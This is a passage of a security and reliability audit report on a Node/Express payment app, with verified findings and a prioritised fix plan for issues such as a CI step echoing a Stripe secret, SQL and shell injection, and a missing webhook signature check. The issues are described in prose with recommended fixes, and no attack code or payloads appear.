- **Verification**: downgraded — The pattern is real. .github/workflows/ci.yml:12-13 maps secrets.STRIPE_SECRET_KEY into env and echoes it. But the claimed exposure is overstated in two ways. First, the value is echoed raw with no transformation. GitHub Actions automatically redacts registered secrets that appear verbatim in logs, so the log shows *** and not the key. The masking gap the reporter mentions applies only to transformed values, and there are none here. Second, the step never runs today. It comes after `run: npm ci` at ci.yml:10, which fails without a lockfile (no package-lock.json in git ls-files; see index 1), and a failed step stops the job. The trigger is `on: [push]` (ci.yml:2), so only people with push access can start a run, and they could already add a workflow that reads the secret. This is a hygiene problem: a fake deploy step should not handle the secret at all. It is not a critical key leak.
- **Rationale**: The step maps secrets.STRIPE_SECRET_KEY into env and then runs echo with the variable interpolated. The value is written to the job log. GitHub masking only matches the exact string, so any transformation of the value would not be masked.
- **File**: .github/workflows/ci.yml
- **Lines**: 12-13
- **Impact**: The Stripe secret key is exposed to anyone who can read the Actions logs or artifacts. It is also exposed to anyone who can trigger runs on pushed branches. The key can be used to charge, refund, or read customer data.
- **Recommendation**: Delete the echo step and the secret env mapping. If a real deploy step is added later, pass the secret only to that step and never print it. Rotate the Stripe key because it has already been logged.
- **Effort**: S

### EXT-2cd8bc: Mail-provider fetch in sendReceipt has no explicit timeout
- **Domain**: external
- **Severity**: low
- **Confidence**: medium
- **Verification**: confirmed — workers/email.js:7-11 calls fetch with no signal, so on Node 20 (ci.yml:9) only undici's defaults bound it. The Worker at workers/email.js:18 sets no concurrency, so it runs one job at a time and a hung call blocks the queue. Only the headers timeout matters here, because the response body is never read (only response.ok at :12). Low severity is appropriate, especially since the worker's deployment is not shown in the repo.
- **Rationale**: The fetch to api.mailprovider.example passes no AbortSignal. Only Node/undici's default headers and body timeouts (about 300s each) bound it. The Worker uses the default concurrency of 1, so one hung provider call holds up every queued receipt for several minutes.
- **File**: workers/email.js
- **Lines**: 7-11
- **Impact**: When the mail provider degrades, the receipt queue stalls for minutes per job instead of failing fast and retrying.
- **Recommendation**: Pass signal: AbortSignal.timeout(10000) to the fetch, and let the resulting error fail the job so the BullMQ retry policy handles it.
- **Effort**: S

### API-decdc8: Poller tick has no error handling, so a DB error crashes the process or stops polling
- **Domain**: backend
- **Severity**: low
- **Confidence**: medium
- **Verification**: confirmed — src/poller.js:11 passes the async tick to setInterval with no catch. src/poller.js:6 is an await db.query with no try/catch, so a DB error becomes an unhandled rejection that kills the process on Node 15+. With pollIntervalMs at 500 (src/config.js:7), slow queries can make ticks overlap. The script only runs when executed directly (src/poller.js:10), and the grep found no other module importing it, so the impact is limited to a dev script. Low is correct.
- **Rationale**: setInterval calls the async tick every 500ms with no catch. A rejected db.query is an unhandled rejection. Ticks also overlap if a query takes longer than the interval.
- **File**: src/poller.js
- **Lines**: 11
- **Impact**: The dev dashboard script dies on the first transient DB error. It is a manual script, so impact is limited.
- **Recommendation**: Wrap tick in try/catch, or use a self-rescheduling setTimeout so ticks cannot overlap.
- **Effort**: S

### DATA-6af88a: Schema is a single unversioned schema.sql with no migration history
- **Domain**: data
- **Severity**: low
- **Confidence**: medium
- **Verification**: confirmed — The only schema artifact is prisma/schema.sql:1-23, written as plain CREATE TABLE statements. git ls-files shows no migrations directory. package.json:5-6 has no migration tool or script, and .github/workflows/ci.yml:10-12 applies no schema. There is no versioned path to an existing database. Low severity is accurate.
- **Rationale**: The schema lives only in prisma/schema.sql, as plain create table statements. No migrations directory or tool is present, and no ORM is in use. The file cannot be applied incrementally or reproducibly to an existing database.
- **File**: prisma/schema.sql
- **Lines**: 1-23
- **Impact**: Schema changes such as the indexes and constraints above have no safe, ordered path to production. Environments can drift apart.
- **Recommendation**: Adopt a versioned migration tool such as node-pg-migrate or dbmate, and move this file into an initial migration.
- **Effort**: M


## Execution Plan
### Immediate
- **SEC-233e01** GET /api/users/:id interpolates req.params.id into SQL [S] — Immediate priority because this is a critical issue with high confidence. — Files: api/users.js — Order: 1
- **SEC-287d42** PATCH /api/users/:id builds the SET clause from request body keys [S] — Immediate priority because this is a critical issue with high confidence. — Files: api/users.js — Order: 2
- **EXT-bfb186** Stripe webhook at POST /webhooks/stripe marks orders paid without verifying the Stripe signature [S] — Immediate priority because this is a critical issue with high confidence. — Files: api/webhooks.js, src/server.js — Order: 3

### Short-term
- **SEC-b7cee0** GET /api/users/:id returns any user's record without an ownership check [S] — Short-term priority because this is a high issue with high confidence. — Files: api/users.js — Order: 1
- **SEC-147c0e** GET /api/users returns every user's email and role to any logged-in user [S] — Short-term priority because this is a high issue with high confidence. — Files: api/users.js — Order: 2
- **API-68df3f** Async Express 4 handlers have no wrapper, so DB errors and validation throws become unhandled rejections [S] — Short-term priority because this is a high issue with high confidence. — Files: api/orders.js, api/users.js, api/webhooks.js — Order: 3
- **SEC-c5ac00** JWT secret falls back to 'change-me' [S] — Short-term priority because this is a high issue with medium confidence. — Files: src/config.js, src/auth.js — Order: 4
- **SEC-465613** POST /api/admin/export passes req.body.table into a shell command [M] — Short-term priority because this is a high issue with high confidence. — Files: api/admin.js — Order: 5
- **QA-142f95** Stripe webhook handler, which marks orders paid and enqueues receipts, has no tests [M] — Short-term priority because this is a high issue with high confidence. — Files: api/webhooks.js — Order: 6

### Medium-term
- **SEC-0bb311** PATCH /api/users/:id lets a user set their own role to admin [S] — Medium-term priority because this is a medium issue with high confidence. — Files: api/users.js, src/auth.js — Order: 1
- **DATA-bf86e8** POST /api/orders inserts the order and its items as separate autocommit statements [S] — Medium-term priority because this is a medium issue with high confidence. — Files: api/orders.js, src/db.js — Order: 2
- **DATA-06a18c** orders.user_id is filtered and used as a foreign key but has no index [S] — Medium-term priority because this is a medium issue with high confidence. — Files: api/orders.js, prisma/schema.sql — Order: 3
- **DATA-72811e** GET /api/users returns every user row with no LIMIT [S] — Medium-term priority because this is a medium issue with high confidence. — Files: api/users.js — Order: 4
- **API-a651bf** Global error handler returns error.message and stack trace to clients [S] — Medium-term priority because this is a medium issue with high confidence. — Files: src/server.js — Order: 5
- **API-08c24c** Server has no SIGTERM handler and never closes the HTTP server, pg pool or BullMQ queue [S] — Medium-term priority because this is a medium issue with high confidence. — Files: src/server.js, workers/email.js — Order: 6
- **INFRA-499905** No lockfile is tracked, so the CI `npm ci` step fails and production dependencies are unpinned [S] — Medium-term priority because this is a medium issue with high confidence. — Files: .github/workflows/ci.yml, package.json — Order: 7
- **PERF-ea4706** GET /api/orders runs one order_items query per order inside a for-await loop [S] — Medium-term priority because this is a medium issue with high confidence. — Files: api/orders.js — Order: 8
- **QA-aeb1e6** The only test, 'health shape', compares a literal to an identical literal and can never fail [S] — Medium-term priority because this is a medium issue with high confidence. — Files: tests/health.test.js — Order: 9
- **SEC-55f50c** Live-format Stripe secret key hardcoded as config fallback [S] — Medium-term priority because this is a medium issue with medium confidence. — Files: src/config.js — Order: 10
- **QA-688993** No linter, formatter or type checker is configured or run in CI [S] — Medium-term priority because this is a medium issue with medium confidence. — Files: package.json — Order: 11
- **PERF-714d61** Admin export blocks the event loop with execSync and buffers the whole table in memory [M] — Medium-term priority because this is a medium issue with high confidence. — Files: api/admin.js — Order: 12
- **SEC-e15003** POST /api/orders takes the order total from client-supplied priceCents [M] — Medium-term priority because this is a medium issue with medium confidence. — Files: api/orders.js — Order: 13
- **DATA-a5b26a** order_items.product_id has no foreign key and no products table exists in the schema [M] — Medium-term priority because this is a medium issue with medium confidence. — Files: prisma/schema.sql — Order: 14

### Backlog
- **EXT-0879f3** Stripe webhook redelivery enqueues a duplicate receipt email [S] — Backlog priority because this is a low issue with high confidence. — Files: api/webhooks.js — Order: 1
- **EXT-875f49** sendReceipt logs mail-provider failures and returns, so BullMQ marks failed receipts as completed [S] — Backlog priority because this is a low issue with high confidence. — Files: workers/email.js, api/webhooks.js — Order: 2
- **API-de4d46** Validation errors tagged status 400 are returned as 500 because the error handler ignores err.status [S] — Backlog priority because this is a low issue with high confidence. — Files: src/server.js, api/orders.js — Order: 3
- **INFRA-9f530e** CI step echoes STRIPE_SECRET_KEY into the workflow log [S] — Backlog priority because this is a low issue with high confidence. — Files: .github/workflows/ci.yml — Order: 4
- **EXT-2cd8bc** Mail-provider fetch in sendReceipt has no explicit timeout [S] — Backlog priority because this is a low issue with medium confidence. — Files: workers/email.js — Order: 5
- **API-decdc8** Poller tick has no error handling, so a DB error crashes the process or stops polling [S] — Backlog priority because this is a low issue with medium confidence. — Files: src/poller.js — Order: 6
- **DATA-6af88a** Schema is a single unversioned schema.sql with no migration history [M] — Backlog priority because this is a low issue with medium confidence. — Files: prisma/schema.sql — Order: 7

